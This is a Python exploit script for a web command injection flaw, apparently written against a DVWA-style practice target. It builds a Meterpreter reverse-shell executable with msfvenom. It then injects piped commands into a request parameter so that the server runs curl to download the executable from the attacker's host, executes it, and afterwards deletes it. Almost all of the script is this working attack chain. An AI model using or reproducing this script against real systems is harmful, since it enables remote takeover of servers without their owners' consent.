#! /usr/bin/python3

import requests
import argparse
import sys
import os
import re


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--param", dest="param", help="Param: -p Submit:Submit;Login:Login;")
    parser.add_argument("-t", "--target", dest="target", help="Target Param: -t ip")
    parser.add_argument("-u", "--url", dest="url", help="URL: -u http://127.0.0.1/")
    parser.add_argument("-c", "--cookies", dest="cookies",
                        help="Cookies: -c PHPSESSID:f8ucrbu0qmta4ettc3208gcvnq& security:low")
    parser.add_argument("-m", "--method", dest="method", help="Method: -m get OR -m POST")
    parser.add_argument("-lh", "--LHOST", dest="LHOST", help="LHOST: -lh 192.168.0.112")
    parser.add_argument("-lp", "--LPORT", dest="LPORT", help="LPORT: -lp 8080")
    options = parser.parse_args()
    return options


def deserializer(serialized):
    deserialized = {}
    pairs = serialized.split(";")
    if pairs[-1] == "":
        del pairs[-1]
    for pair in pairs:
        pair = pair.split(":")
        deserialized[pair[0]] = pair[1]
    return deserialized


def send_request(url, target_param, payload, param, req_cookies=None):
    """
    This sends the request
    :param url: URL of the application / page
    :param target_param : target param to drop payload.
    :param param: parameters to be sent along with request.
    :param payload: payload to be sent along with request.
    :param req_cookies: cookies to be sent along with request. DeSerialized Dictionary
    :return:
    """
    print(f"[*]URL : {url}")
    print("[*]Cookies", req_cookies)
    print(f"[*]Param: {param+target_param}\n[*]Payload: {payload}")
    param = deserializer(target_param + ":" + payload + ";" + param)
    print(target_param)
    if METHOD.lower() == "get":
        return requests.get(url, cookies=req_cookies, params=param)
    else:
        return requests.post(url, cookies=req_cookies, data=param)


arguments = get_arguments()


if arguments.method and arguments.method.lower() in ("get", "post"):
    METHOD = arguments.method
elif arguments.method:
    print("[-] Please enter valid method. GET or POST.")
    sys.exit()
else:
    METHOD = "post"

if arguments.url:
    URL = arguments.url
    RHOST = re.search("(\d{1,3}\.?){4}", URL)[0]
else:
    print("[-] Please provide either URL")
    sys.exit()

cookies = deserializer(arguments.cookies) if arguments.cookies else {}


if not arguments.LHOST:
    print("[-] Please provide LHOST")
    sys.exit()
else:
    LHOST = arguments.LHOST

if not arguments.LPORT:
    print("[-] Please provide LPORT")
    sys.exit()
else:
    LPORT = arguments.LPORT

try:
    os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -f exe > shell.exe")

    print(f"[+] You'll need to host a web server at {LHOST}:{LPORT} at path " +
          os.path.dirname(os.path.realpath(__file__)) + ".")
    print(f"[...] sudo python3 -m http.server 80")
    input("[*] Hit enter once done... ")

    send_request(URL, arguments.target, "|curl " + LHOST + "/shell.exe -o shell.exe", arguments.param, cookies)

    print(f"""[+] You'll need to start a handler at LHOST:{LHOST}, LPORT:{LPORT} in msfconsole. 
        Set Payload to windows/meterpreter/reverse_tcp. Set RHOST to """)
    input("[*] Hit enter once done... ")

    send_request(URL, arguments.target, "|shell.exe", arguments.param, cookies)
except KeyboardInterrupt:
    print("[-] Interrupt observed. Exiting...")
finally:
    print("[-] Cleaning up...")
    os.system("rm shell.exe")
    send_request(URL, arguments.target, "|rm shell.exe", arguments.param, cookies)
    sys.exit()
